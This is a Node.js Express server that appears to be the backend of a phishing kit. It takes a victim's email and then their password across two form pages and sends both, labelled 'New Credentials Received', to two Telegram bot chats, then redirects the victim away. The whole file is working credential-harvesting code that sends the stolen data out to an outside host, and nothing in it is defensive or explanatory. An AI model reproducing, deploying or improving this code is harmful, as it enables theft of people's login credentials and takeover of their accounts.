import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import dotenv from 'dotenv';

dotenv.config();

const app = express();

// First Telegram bot credentials
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Second Telegram bot credentials
const TELEGRAM_BOT_TOKEN_2 = process.env.TELEGRAM_BOT_TOKEN_2;
const TELEGRAM_CHAT_ID_2 = process.env.TELEGRAM_CHAT_ID_2;

// Validate environment variables
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !TELEGRAM_BOT_TOKEN_2 || !TELEGRAM_CHAT_ID_2) {
  console.error('Error: Missing Telegram bot credentials in .env file');
  process.exit(1);
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Enhanced sendToTelegram function that can send to either bot
async function sendToTelegram(message, botNumber = 1) {
  try {
    // Determine which bot credentials to use
    const botToken = botNumber === 1 ? TELEGRAM_BOT_TOKEN : TELEGRAM_BOT_TOKEN_2;
    const chatId = botNumber === 1 ? TELEGRAM_CHAT_ID : TELEGRAM_CHAT_ID_2;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML', // Added HTML parsing for better formatting
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`Failed to send message to Telegram Bot ${botNumber}:`, errorText);
      return false;
    }
    return true;
  } catch (error) {
    console.error(`Error sending message to Telegram Bot ${botNumber}:`, error);
    return false;
  }
}

// Function to send to both bots simultaneously
async function sendToAllBots(message) {
  try {
    const [bot1Result, bot2Result] = await Promise.all([
      sendToTelegram(message, 1),
      sendToTelegram(message, 2)
    ]);
    
    return bot1Result && bot2Result;
  } catch (error) {
    console.error('Error sending to all bots:', error);
    return false;
  }
}

// Store email temporarily
let emailCache = {};

app.post('/email', async (req, res) => {
  const email = req.body.email;
  console.log('Email received:', email);

  // Store the email with a unique identifier (could use session ID or IP)
  const clientId = req.ip; // Using IP as a simple identifier
  emailCache[clientId] = email;
  
  res.redirect('/password.html');
});

app.post('/password', async (req, res) => {
  console.log('Request body:', req.body);
  const password = req.body.passwd;
  console.log('Password received:', password);

  if (!password) {
    return res.status(400).send('Password is required');
  }

  // Get the client's email from cache
  const clientId = req.ip;
  const email = emailCache[clientId];
  
  // Prepare the combined message
  let message = '🔐 New Credentials Received:\n\n';
  if (email) {
    message += `📧 Email: <code>${email}</code>\n`;
    // Remove the email from cache after use
    delete emailCache[clientId];
  }
  message += `🔑 Password: <code>${password}</code>\n\n⚠️ Handle with care!`;

  // Send to both bots with better formatting
  await sendToAllBots(message);
  res.redirect('/index.html');
});

// New endpoint to test bot connections
app.get('/test-bots', async (req, res) => {
  try {
    const testMessage = '🤖 Bot connection test successful!';
    
    const bot1Success = await sendToTelegram(`Bot 1: ${testMessage}`, 1);
    const bot2Success = await sendToTelegram(`Bot 2: ${testMessage}`, 2);
    
    if (bot1Success && bot2Success) {
      res.send('Both bots are working correctly!');
    } else {
      res.status(500).send('One or both bots failed to respond');
    }
  } catch (error) {
    res.status(500).send('Error testing bots: ' + error.message);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});